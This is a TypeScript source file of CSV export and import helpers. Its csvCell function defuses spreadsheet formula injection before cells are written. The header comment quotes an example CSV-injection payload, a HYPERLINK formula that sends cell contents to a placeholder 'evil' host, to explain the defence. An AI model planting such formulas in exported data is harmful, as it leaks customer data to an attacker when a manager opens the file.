// CSV helpers shared by every export / import in the staff areas.
//
// Customer-supplied text (names, e-mail addresses, product snapshots) ends up in files that a
// manager opens in a spreadsheet. A cell that starts with = + - @ is a FORMULA there — a lead
// named `=HYPERLINK("http://evil/?"&A2,"click")` is a classic data-exfiltration trick (OWASP
// "CSV injection"). Every cell therefore goes through csvCell().

/** One value as a quoted CSV cell: quotes doubled, line breaks flattened, formulas defused. */
export function csvCell(value: unknown): string {
  const text = String(value ?? "").replace(/[\r\n]+/g, " ");
  // = + - @ start a formula (| and % are accepted by DDE in older Excel builds). Some spreadsheets
  // ignore leading whitespace, so " =1+1" is tested like "=1+1". A leading tab keeps the cell text.
  const defused = /^[=+\-@|%]/.test(text.trimStart()) ? `\t${text}` : text;
  return `"${defused.replace(/"/g, '""')}"`;
}

/** Rows → CSV text (CRLF, RFC 4180). `delimiter` is "," or ";" (semicolon opens cleanly in EU locales). */
export function toCsv(rows: unknown[][], delimiter: "," | ";" = ","): string {
  return rows.map((row) => row.map(csvCell).join(delimiter)).join("\r\n");
}

/**
 * Parses CSV text into rows of cells. Handles quoted cells (with commas, doubled quotes and line
 * breaks inside), CRLF / LF line ends and a UTF-8 BOM. Blank lines are dropped.
 */
export function parseCsv(text: string, delimiter: "," | ";" = ","): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  const src = text.replace(/^\uFEFF/, "");

  const endCell = () => { row.push(cell); cell = ""; };
  const endRow = () => {
    endCell();
    if (row.some((c) => c.trim() !== "")) rows.push(row.map((c) => c.trim()));
    row = [];
  };

  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (quoted) {
      if (ch === '"') {
        if (src[i + 1] === '"') { cell += '"'; i++; } else quoted = false;
      } else cell += ch;
    } else if (ch === '"' && cell === "") quoted = true;
    else if (ch === delimiter) endCell();
    else if (ch === "\n") endRow();
    else if (ch === "\r") { if (src[i + 1] === "\n") i++; endRow(); }
    else cell += ch;
  }
  if (cell !== "" || row.length > 0) endRow();
  return rows;
}

/** Saves text as a file through the browser (an object URL on a temporary link). */
export function downloadTextFile(filename: string, content: string, mime = "text/csv;charset=utf-8"): void {
  // the BOM makes Excel read UTF-8 (accents, ç, ã…) correctly
  const blob = new Blob(["\uFEFF" + content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
